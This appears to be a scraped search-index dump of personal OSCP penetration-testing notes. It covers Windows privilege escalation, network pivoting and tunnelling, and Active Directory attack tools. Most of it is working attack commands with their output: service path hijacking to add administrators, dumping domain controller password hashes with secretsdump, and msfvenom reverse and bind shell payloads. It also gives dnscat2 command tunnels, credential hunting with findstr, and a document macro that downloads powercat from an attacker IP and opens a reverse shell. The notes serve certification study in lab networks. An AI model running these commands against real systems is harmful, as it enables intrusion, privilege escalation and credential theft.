Binary Path Let‚Äôs change the binary path to execute a command which adds our current user to the default local administrators group.\nServer Operators\nC:\\local\u003e sc config AppReadiness binPath= \"cmd /c net localgroup Administrators server_adm /add\" [SC] ChangeServiceConfig SUCCESS Starting the Service Starting the service fails, which is expected.\nServer Operators\nC:\\local\u003e sc start AppReadiness [SC] StartService FAILED 1053: The service did not respond to the start or control request in a timely fashion. Confirming Local Admin Group Membership If we check the membership of the administrators group, we see that the command was executed successfully.\nServer Operators\nC:\\local\u003e net localgroup Administrators Alias name Administrators Comment Administrators have complete and unrestricted access to the computer/domain Members ------------------------------------------------------------------------------- Administrator Domain Admins Enterprise Admins server_adm The command completed successfully. Confirming Local Admin Access on Domain Controller From here, we have full control over the Domain Controller and could retrieve all credentials from the NTDS database and access other systems, and perform post-exploitation tasks.\nServer Operators\ncube111@local[/local]$ crackmapexec smb 10.129.43.9 -u server_adm -p 'local_@cademy_stdnt!' SMB 10.129.43.9 445 WINLPE-DC01 [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False) SMB 10.129.43.9 445 WINLPE-DC01 [+] INLANEFREIGHT.LOCAL\\server_adm:local_@cademy_stdnt! (Pwn3d!) Retrieving NTLM Password Hashes from the Domain Controller Server Operators\ncube111@local[/local]$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation Password: [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43 Administrator:aes128-cts-hmac-sha1-96:94c300d0e47775b407f2496a5cca1a0a Administrator:des-cbc-md5:d60dfbbf20548938 [*] Cleaning up... credential hunting\nfindstr /SIM /C:\"pass\" *.ini *.cfg *.config *.xml IF u get a netwrok or sservice local account can escalate and get seimpersonate priv\nhttps://github.com/itm4n/FullPowers\nWeak Permissions-SERVICE BINARY HIJACKING PS C:\\local\u003e .\\SharpUp.exe audit === SharpUp: Running Privilege Escalation Checks === === Modifiable Service Binaries === Name : SecurityService DisplayName : PC Security Management Service Description : Responsible for managing PC security State : Stopped StartMode : Auto PathName : \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\" \u003cSNIP\u003e Checking Permissions with icacls Using icacls we can verify the vulnerability and see that the EVERYONE and BUILTIN\\Users groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents.\nWeak Permissions\nPS C:\\local\u003e icacls \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\" C:\\Program Files (x86)\\PCProtect\\SecurityService.exe BUILTIN\\Users:(I)(F) Everyone:(I)(F) NT AUTHORITY\\SYSTEM:(I)(F) BUILTIN\\Administrators:(I)(F) APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX) APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX) Successfully processed 1 files; Failed processing 0 files Replacing Service Binary This service is also startable by unprivileged users, so we can make a backup of the original binary and replace it with a malicious binary generated with msfvenom. It can give us a reverse shell as SYSTEM, or add a local admin user and give us full administrative control over the machine.\nWeak Permissions\nC:\\local\u003e cmd /c copy /Y SecurityService.exe \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\" C:\\local\u003e sc start SecurityService Weak Service Permissions Reviewing SharpUp Again Let‚Äôs check the SharpUp output again for any modifiable services. We see the WindscribeService is potentially misconfigured.\nWeak Permissions\nC:\\local\u003e SharpUp.exe audit === SharpUp: Running Privilege Escalation Checks === === Modifiable Services === Name : WindscribeService DisplayName : WindscribeService Description : Manages the firewall and controls the VPN tunnel State : Running StartMode : Auto PathName : \"C:\\Program Files (x86)\\Windscribe\\WindscribeService.exe\" Checking Permissions with AccessChk Next, we‚Äôll use AccessChk from the Sysinternals suite to enumerate permissions on the service. The flags we use, in order, are -q (omit banner), -u (suppress errors), -v (verbose), -c (specify name of a Windows service), and -w (show only objects that have write access). Here we can see that all Authenticated Users have SERVICE_ALL_ACCESS rights over the service, which means full read/write control over it.\nWeak Permissions\nC:\\local\u003e accesschk.exe /accepteula -quvcw WindscribeService Accesschk v6.13 - Reports effective permissions for securable objects Copyright ‚åê 2006-2020 Mark Russinovich Sysinternals - www.sysinternals.com WindscribeService Medium Mandatory Level (Default) [No-Write-Up] RW NT AUTHORITY\\SYSTEM SERVICE_ALL_ACCESS RW BUILTIN\\Administrators SERVICE_ALL_ACCESS RW NT AUTHORITY\\Authenticated Users SERVICE_ALL_ACCESS Changing the Service Binary Path We can use our permissions to change the binary path maliciously. Let‚Äôs change it to add our user to the local administrator group. We could set the binary path to run any command or executable of our choosing (such as a reverse shell binary).\nWeak Permissions\nC:\\local\u003e sc config WindscribeService binpath=\"cmd /c net localgroup administrators local-student /add\" [SC] ChangeServiceConfig SUCCESS Stopping Service Next, we must stop the service, so the new binpath command will run the next time it is started.\nWeak Permissions\nC:\\local\u003e sc stop WindscribeService SERVICE_NAME: WindscribeService TYPE : 10 WIN32_OWN_PROCESS STATE : 3 STOP_PENDING (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x4 WAIT_HINT : 0x0 Starting the Service Since we have full control over the service, we can start it again, and the command we placed in the binpath will run even though an error message is returned. The service fails to start because the binpath is not pointing to the actual service executable. Still, the executable will run when the system attempts to start the service before erroring out and stopping the service again, executing whatever command we specify in the binpath.\nWeak Permissions\nC:\\local\u003e sc start WindscribeService [SC] StartService FAILED 1053: The service did not respond to the start or control request in a timely fashion. Confirming Local Admin Group Addition Finally, check to confirm that our user was added to the local administrators group.\nWeak Permissions\nC:\\local\u003e net localgroup administrators Alias name administrators Comment Administrators have complete and unrestricted access to the computer/domain Members ------------------------------------------------------------------------------- Administrator local-student mrb3n The command completed successfully. Unquoted Service Path Service Binary Path C:\\Program Files (x86)\\System Explorer\\service\\SystemExplorerService64.exe Windows will decide the execution method of a program based on its file extension, so it‚Äôs not necessary to specify it. Windows will attempt to load the following potential executables in order on service start, with a .exe being implied:\nC:\\Program C:\\Program Files C:\\Program Files (x86)\\System C:\\Program Files (x86)\\System Explorer\\service\\SystemExplorerService64 Searching for Unquoted Service Paths We can identify unquoted service binary paths using the command below.\nC:\\local\u003e wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\"\" GVFS.Service GVFS.Service C:\\Program Files\\GVFS\\GVFS.Service.exe Auto System Explorer Service SystemExplorerHelpService C:\\Program Files (x86)\\System Explorer\\service\\SystemExplorerService64.exe Auto WindscribeService WindscribeService C:\\Program Files (x86)\\Windscribe\\WindscribeService.exe Auto Querying Service C:\\local\u003e sc qc SystemExplorerHelpService [SC] QueryServiceConfig SUCCESS SERVICE_NAME: SystemExplorerHelpService TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 0 IGNORE BINARY_PATH_NAME : C:\\Program Files (x86)\\System Explorer\\service\\SystemExplorerService64.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : System Explorer Service DEPENDENCIES : SERVICE_START_NAME : LocalSystem",
    "description": "Windows Privilege Escalation Abusing Windows group privileges Abusing Windows user privileges Bypassing User Account Control Abusing weak service/file permissions Leveraging unpatched kernel exploits Credential theft Traffic Capture and more. MACROS\ngo to tools‚Äì\u003emacros‚Äì\u003eoraganise macros‚Äî\u003ebasic‚Äî\u003eclick on untitled‚Äî\u003enew‚Äî\u003eshell commands\nthen save it as .odt\nSub Main Shell(\"cmd /c powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.234/powercat.ps1');powercat -c 192.168.45.169 -p 4444 -e powershell\") End Sub SERvice binary hijacking\n#include int main () { int i; i = system (‚Äúnet user dave2 password123!",
    "tags": [],
    "title": "Windows Privilege Escalation",
    "uri": "/oscp-notes/windows-privilege-escalation/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "Scanning the Pivot Target Dynamic Port Forwarding with SSH and SOCKS Tunneling\ncube111@local[/local]$ nmap -sT -p22,3306 10.129.202.64 Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 EST Nmap scan report for 10.129.202.64 Host is up (0.12s latency). PORT STATE SERVICE 22/tcp open ssh 3306/tcp closed mysql Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds to acces mysql we can port forward using ssh\ncube111@local[/local]$ ssh -L 1234:localhost:3306 ubuntu@10.129.202.64 ubuntu@10.129.202.64's password: Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu 24 Feb 2022 05:23:20 PM UTC Confirming Port Forward with Netstat on attackers machine Dynamic Port Forwarding with SSH and SOCKS Tunneling\ncube111@local[/local]$ netstat -antp | grep 1234 Confirming Port Forward with Nmap Dynamic Port Forwarding with SSH and SOCKS Tunneling\ncube111@local[/local]$ nmap -v -sV -p1234 localhost Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:18 EST NSE: Loaded 45 scripts for scanning. Initiating Ping Scan at 12:18 Scanning localhost (127.0.0.1) [2 ports] Completed Ping Scan at 12:18, 0.01s elapsed (1 total hosts) Initiating Connect Scan at 12:18 Scanning localhost (127.0.0.1) [1 port] Discovered open port 1234/tcp on 127.0.0.1 Completed Connect Scan at 12:18, 0.01s elapsed (1 total ports) Initiating Service scan at 12:18 Scanning 1 service on localhost (127.0.0.1) Completed Service scan at 12:18, 0.12s elapsed (1 service on 1 host) NSE: Script scanning 127.0.0.1. Initiating NSE at 12:18 Completed NSE at 12:18, 0.01s elapsed Initiating NSE at 12:18 Completed NSE at 12:18, 0.00s elapsed Nmap scan report for localhost (127.0.0.1) Host is up (0.0080s latency). Other addresses for localhost (not scanned): ::1 PORT STATE SERVICE VERSION 1234/tcp open mysql MySQL 8.0.28-0ubuntu0.20.04.3 Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds Forwarding Multiple Ports Dynamic Port Forwarding with SSH and SOCKS Tunneling\ncube111@local[/local]$ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64 Setting up to Pivot cube111@local[/local]$ ssh -D 9050 ubuntu@10.129.202.64 cube111@local[/local]$ ssh -D 9050 ubuntu@10.129.202.64 cube111@local[/local]$ tail -4 /etc/proxychains.conf # meanwile # defaults set to \"tor\" socks4 127.0.0.1 9050 cube111@local[/local]$ proxychains nmap -v -sn 172.16.5.1-200 Enumerating the Windows Target through Proxychains Dynamic Port Forwarding with SSH and SOCKS Tunneling\ncube111@local[/local]$ proxychains nmap -v -Pn -sT 172.16.5.19 *************************This part of packing all your Nmap data using proxychains and forwarding it to a remote server is called SOCKS tunneling. One more important note to remember here is that we can only perform a full TCP connect scan over proxychains. The reason for this is that proxychains cannot understand partial packets. If you send partial packets like half connect scans, it will return incorrect results. We also need to make sure we are aware of the fact that host-alive checks may not work against Windows targets because the Windows Defender firewall blocks ICMP requests (traditional pings) by default.***********************************************\nUsing Metasploit with Proxychains We can also open Metasploit using proxychains and send all associated traffic through the proxy we have established.\nDynamic Port Forwarding with SSH and SOCKS Tunneling\ncube111@local[/local]$ proxychains msfconsole Using xfreerdp with Proxychains Dynamic Port Forwarding with SSH and SOCKS Tunneling\ncube111@local[/local]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 ProxyChains-3.1 (http://proxychains.sf.net) Ping Sweep For Loop on Linux Pivot Hosts Meterpreter Tunneling \u0026 Port Forwarding\nfor i in {1..254} ;do (ping -c 1 172.16.5.$i | grep \"bytes from\" \u0026) ;done Ping Sweep For Loop Using CMD Meterpreter Tunneling \u0026 Port Forwarding\nfor /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find \"Reply\" Ping Sweep Using PowerShell Meterpreter Tunneling \u0026 Port Forwarding\n1..254 | % {\"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)\"} Remote/Reverse Port Forwarding with SSH Using SSH -R Remote/Reverse Port Forwarding with SSH\ncube111@local[/local]$ ssh -R \u003cInternalIPofPivotHost\u003e:8080:0.0.0.0:8000 ubuntu@\u003cipAddressofTarget\u003e -vN Meterpreter Tunneling \u0026 Port Forwarding cube111@local[/local]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080 Configuring \u0026 Starting the multi/handler Meterpreter Tunneling \u0026 Port Forwarding\nmsf6 \u003e use exploit/multi/handler Configuring MSF‚Äôs SOCKS Proxy Meterpreter Tunneling \u0026 Port Forwarding\nConfiguring MSF's SOCKS Proxy Meterpreter Tunneling \u0026 Port Forwarding msf6 \u003e use auxiliary/server/socks_proxy msf6 auxiliary(server/socks_proxy) \u003e set SRVPORT 9050 SRVPORT =\u003e 9050 msf6 auxiliary(server/socks_proxy) \u003e set SRVHOST 0.0.0.0 SRVHOST =\u003e 0.0.0.0 msf6 auxiliary(server/socks_proxy) \u003e set version 4a version =\u003e 4a msf6 auxiliary(server/socks_proxy) \u003e run [*] Auxiliary module running as background job 0. [*] Starting the SOCKS proxy server msf6 auxiliary(server/socks_proxy) \u003e options Module options (auxiliary/server/socks_proxy): Name Current Setting Required Description ---- --------------- -------- ----------- SRVHOST 0.0.0.0 yes The address to listen on SRVPORT 9050 yes The port to listen on VERSION 4a yes The SOCKS version to use (Accepted: 4a, 5) Auxiliary action: Name Description ---- ----------- Proxy Run a SOCKS proxy server Creating Routes with AutoRoute Meterpreter Tunneling \u0026 Port Forwarding\nmsf6 \u003e use post/multi/manage/autoroute msf6 post(multi/manage/autoroute) \u003e set SESSION 1 SESSION =\u003e 1 msf6 post(multi/manage/autoroute) \u003e set SUBNET 172.16.5.0 SUBNET =\u003e 172.16.5.0 msf6 post(multi/manage/autoroute) \u003e run [!] SESSION may not be compatible with this module: [!] * incompatible session platform: linux [*] Running module against 10.129.202.64 [*] Searching for subnets to autoroute. [+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table. [+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table. [*] Post module execution completed It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.\nMeterpreter Tunneling \u0026 Port Forwarding\nmeterpreter \u003e run autoroute -s 172.16.5.0/23 [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute. [!] Example: run post/multi/manage/autoroute OPTION=value [...] [*] Adding a route to 172.16.5.0/255.255.254.0... [+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64 [*] Use the -p option to list all active routes Socat Redirection with a Reverse Shell Starting Socat Listener Socat Redirection with a Reverse Shell\nubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80 Configuring \u0026 Starting the multi/handler Socat Redirection with a Reverse Shell\nmsf6 \u003e use exploit/multi/handler Socat Redirection with a Bind Shell ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443 Creating the Windows Payload Socat Redirection with a Bind Shell\ncube111@local[/local]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 499 bytes Final size of exe file: 7168 bytes Saved as: backupjob.exe Configuring \u0026 Starting the Bind multi/handler Socat Redirection with a Bind Shell\nmsf6 \u003e use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) \u003e set payload windows/x64/meterpreter/bind_tcp payload =\u003e windows/x64/meterpreter/bind_tcp msf6 exploit(multi/handler) \u003e set RHOST 10.129.202.64 RHOST =\u003e 10.129.202.64 msf6 exploit(multi/handler) \u003e set LPORT 8080 LPORT =\u003e 8080 msf6 exploit(multi/handler) \u003e run [*] Started bind TCP handler against 10.129.202.64:8080 SSH for Windows: plink.exe putty plink -ssh -D 9050 ubuntu@10.129.15.50 Another Windows-based tool called Proxifier can be used to start a SOCKS tunnel via the SSH session we created. Proxifier is a Windows tool that creates a tunneled network for desktop client applications and allows it to operate through a SOCKS or HTTPS proxy and allows for proxy chaining. It is possible to create a profile where we can provide the configuration for our SOCKS server started by Plink on port 9050.\nSSH Pivoting with Sshuttle Running sshuttle SSH Pivoting with Sshuttle\ncube111@local[/local]$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v Starting sshuttle proxy (version 1.1.0). c : Starting firewall manager with command: ['/usr/bin/python3', '/usr/local/lib/python3.9/dist-packages/sshuttle/__main__.py', '-v', '--method', 'auto', '--firewall'] fw: Starting firewall with Python version 3.9.2 fw: ready method name nat. c : IPv6 enabled: Using default IPv6 listen address ::1 c : Method: nat c : IPv4: on c : IPv6: on c : UDP : off (not available with nat method) c : DNS : off (available) c : User: off (available) c : Subnets to forward through remote host (type, IP, cidr mask width, startPort, endPort): c : (\u003cAddressFamily.AF_INET: 2\u003e, '172.16.5.0', 32, 0, 0) c : Subnets to exclude from forwarding: c : (\u003cAddressFamily.AF_INET: 2\u003e, '127.0.0.1', 32, 0, 0) c : (\u003cAddressFamily.AF_INET6: 10\u003e, '::1', 128, 0, 0) c : TCP redirector listening on ('::1', 12300, 0, 0). c : TCP redirector listening on ('127.0.0.1', 12300). c : Starting client with Python version 3.9.2 c : Connecting to server... ubuntu@10.129.202.64's password: s: Running server on remote host with /usr/bin/python3 (version 3.8.10) s: latency control setting = True s: auto-nets:False c : Connected to server. fw: setting up. fw: ip6tables -w -t nat -N sshuttle-12300 fw: ip6tables -w -t nat -F sshuttle-12300 fw: ip6tables -w -t nat -I OUTPUT 1 -j sshuttle-12300 fw: ip6tables -w -t nat -I PREROUTING 1 -j sshuttle-12300 fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN --dest ::1/128 -p tcp fw: iptables -w -t nat -N sshuttle-12300 fw: iptables -w -t nat -F sshuttle-12300 fw: iptables -w -t nat -I OUTPUT 1 -j sshuttle-12300 fw: iptables -w -t nat -I PREROUTING 1 -j sshuttle-12300 fw: iptables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL fw: iptables -w -t nat -A sshuttle-12300 -j RETURN --dest 127.0.0.1/32 -p tcp Web Server Pivoting with Rpivot Running server.py from the Attack Host Web Server Pivoting with Rpivot\ncube111@local[/local]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0 Transfering rpivot to the Target Web Server Pivoting with Rpivot\ncube111@local[/local]$ scp -r rpivot ubuntu@\u003cIpaddressOfTarget\u003e:/home/ubuntu/ Running client.py from Pivot Target Web Server Pivoting with Rpivot\nubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999 Backconnecting to server 10.10.14.18 port 9999 Using Netsh.exe to Port Forward Port Forwarding with Windows Netsh\nC:\\Windows\\system32\u003e netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25 Verifying Port Forward Port Forwarding with Windows Netsh\nC:\\Windows\\system32\u003e netsh.exe interface portproxy show v4tov4 DNS Tunneling with Dnscat2 Cloning dnscat2 and Setting Up the Server DNS Tunneling with Dnscat2\ncube111@local[/local]$ git clone https://github.com/iagox86/dnscat2.git cd dnscat2/server/ sudo gem install bundler sudo bundle instal cube111@local[/local]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache New window created: 0 dnscat2\u003e New window created: crypto-debug Welcome to dnscat2! Some documentation may be out of date. auto_attach =\u003e false history_size (for new windows) =\u003e 1000 Security policy changed: All connections must be encrypted New window created: dns1 Starting Dnscat2 DNS server on 10.10.14.18:53 [domains = inlanefreight.local]... Assuming you have an authoritative DNS server, you can run Cloning dnscat2-powershell to the Attack Host DNS Tunneling with Dnscat2\ncube111@local[/local]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git Importing dnscat2.ps1 DNS Tunneling with Dnscat2\nPS C:\\local\u003e Import-Module .\\dnscat2.ps1 PS C:\\local\u003e Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd Interacting with the Established Session DNS Tunneling with Dnscat2\ndnscat2\u003e window -i 1 New window created: 1 history_size (session) =\u003e 1000 Session 1 Security: ENCRYPTED AND VERIFIED! (the security depends on the strength of your pre-shared secret!) This is a console session! That means that anything you type will be sent as-is to the client, and anything they type will be displayed as-is on the screen! If the client is executing a command and you don't see a prompt, try typing 'pwd' or something! To go back, type ctrl-z. Microsoft Windows [Version 10.0.18363.1801] (c) 2019 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u003e exec (OFFICEMANAGER) 1\u003e Starting the Chisel Server on our Attack Host cube111@local[/local]$ sudo ./chisel server --reverse -v -p 1234 --socks5 2022/05/30 10:19:16 server: Reverse tunnelling enabled 2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk= 2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234 ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks Running the Chisel Server on the Pivot Host SOCKS5 Tunneling with Chisel\nubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5 2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac= 2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234 Connecting to the Chisel Server SOCKS5 Tunneling with Chisel\ncube111@local[/local]$ ./chisel client -v 10.129.202.64:1234 socks 2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234 2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=\u003esocks: Listening 2022/05/05 14:21:18 client: tun: Bound proxies 2022/05/05 14:21:19 client: Handshaking... 2022/05/05 14:21:19 client: Sending config 2022/05/05 14:21:19 client: Connected (Latency 120.170822ms) 2022/05/05 14:21:19 client: tun: SSH connected proxytunnel proxytunnel-p $IP:3128 -d 127.0.0.1:22 -a 4444",
    "description": "Scanning the Pivot Target Dynamic Port Forwarding with SSH and SOCKS Tunneling\ncube111@local[/local]$ nmap -sT -p22,3306 10.129.202.64 Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 EST Nmap scan report for 10.129.202.64 Host is up (0.12s latency). PORT STATE SERVICE 22/tcp open ssh 3306/tcp closed mysql Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds to acces mysql we can port forward using ssh\ncube111@local[/local]$ ssh -L 1234:localhost:3306 ubuntu@10.",
    "tags": [],
    "title": "Scanning the Pivot Target",
    "uri": "/oscp-notes/pivoting_tunneling/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "https://github.com/initstring/linkedin2username\n==TOOLS==\nTool Description PowerView/SharpView A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows net* commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some ‚Äúquick wins‚Äù such as users that can be attacked via Kerberoasting or ASREPRoasting. BloodHound Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the SharpHound PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a Neo4j database for graphical analysis of the AD environment. SharpHound The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis. BloodHound.py A Python-based BloodHound ingestor based on the Impacket toolkit. It supports most BloodHound collection methods and can be run from a non-domain joined attack host. The output can be ingested into the BloodHound GUI for analysis. Kerbrute A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts, perform password spraying, and brute-forcing. Impacket toolkit A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory. Responder Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions. Inveigh.ps1 Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks. C# Inveigh (InveighZero) The C# version of Inveigh with a semi-interactive console for interacting with captured data such as username and password hashes. rpcinfo The rpcinfo utility is used to query the status of an RPC program or enumerate the list of available RPC services on a remote host. The ‚Äú-p‚Äù option is used to specify the target host. For example the command ‚Äúrpcinfo -p 10.0.0.1‚Äù will return a list of all the RPC services available on the remote host, along with their program number, version number, and protocol. Note that this command must be run with sufficient privileges. rpcclient A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service. CrackMapExec (CME) CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to ‚Äúlive off the land‚Äù and abuse built-in AD features and protocols like SMB, WMI, WinRM, and MSSQL. Rubeus Rubeus is a C# tool built for Kerberos Abuse. GetUserSPNs.py Another Impacket module geared towards finding Service Principal names tied to normal users. Hashcat A great hash cracking and password recovery tool. enum4linux A tool for enumerating information from Windows and Samba systems. enum4linux-ng A rework of the original Enum4linux tool that works a bit differently. ldapsearch Built-in interface for interacting with the LDAP protocol. windapsearch A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries. DomainPasswordSpray.ps1 DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. LAPSToolkit The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft‚Äôs Local Administrator Password Solution (LAPS). smbmap SMB share enumeration across a domain. psexec.py Part of the Impacket toolkit, it provides us with Psexec-like functionality in the form of a semi-interactive shell. wmiexec.py Part of the Impacket toolkit, it provides the capability of command execution over WMI. Snaffler Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares. smbserver.py Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network. setspn.exe Adds, reads, modifies and deletes the Service Principal Names (SPN) directory property for an Active Directory service account. Mimikatz Performs many functions. Notably, pass-the-hash attacks, extracting plaintext passwords, and Kerberos ticket extraction from memory on a host. secretsdump.py Remotely dump SAM and LSA secrets from a host. evil-winrm Provides us with an interactive shell on a host over the WinRM protocol. mssqlclient.py Part of the Impacket toolkit, it provides the ability to interact with MSSQL databases. noPac.py Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user. rpcdump.py Part of the Impacket toolset, RPC endpoint mapper. CVE-2021-1675.py Printnightmare PoC in python. ntlmrelayx.py Part of the Impacket toolset, it performs SMB relay attacks. PetitPotam.py PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions. gettgtpkinit.py Tool for manipulating certificates and TGTs. getnthash.py This tool will use an existing TGT to request a PAC for the current user using U2U. adidnsdump A tool for enumerating and dumping DNS records from a domain. Similar to performing a DNS Zone transfer. gpp-decrypt Extracts usernames and passwords from Group Policy preferences files. GetNPUsers.py Part of the Impacket toolkit. Used to perform the ASREPRoasting attack to list and obtain AS-REP hashes for users with the ‚ÄòDo not require Kerberos preauthentication‚Äô set. These hashes are then fed into a tool such as Hashcat for attempts at offline password cracking. lookupsid.py SID bruteforcing tool. ticketer.py A tool for creation and customization of TGT/TGS tickets. It can be used for Golden Ticket creation, child to parent trust attacks, etc. raiseChild.py Part of the Impacket toolkit, It is a tool for automated child to parent domain privilege escalation. Active Directory Explorer Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for offline analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions. PingCastle Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on CMMI adapted to AD security). Group3r Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO). ADRecon A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment‚Äôs overall security state. Previous\nIdentifying Hosts First, let‚Äôs take some time to listen to the network and see what‚Äôs going on. We can use Wireshark and TCPDump to ‚Äúput our ear to the wire‚Äù and see what hosts and types of network traffic we can capture. This is particularly helpful if the assessment approach is ‚Äúblack box.‚Äù We notice some ARP requests and replies, MDNS, and other basic layer two packets (since we are on a switched network, we are limited to the current broadcast domain) some of which we can see below. This is a great start that gives us a few bits of information about the customer‚Äôs network setup.\ncube111@local[/local]$ sudo tcpdump -i ens224 Nmap Scanning sudo nmap -v -A -iL hosts.txt -oN /home/local-student/Documents/host-enum Username Brutreforce using kerbrute\nCloning Kerbrute GitHub Repo Initial Enumeration of the Domain\ncube111@local[/local]$ sudo git clone https://github.com/ropnop/kerbrute.git cube111@local[/local]$ make help help: Show this help. windows: Make Windows x86 and x64 Binaries linux: Make Linux x86 and x64 Binaries mac: Make Darwin (Mac) x86 and x64 Binaries clean: Delete any binaries all: 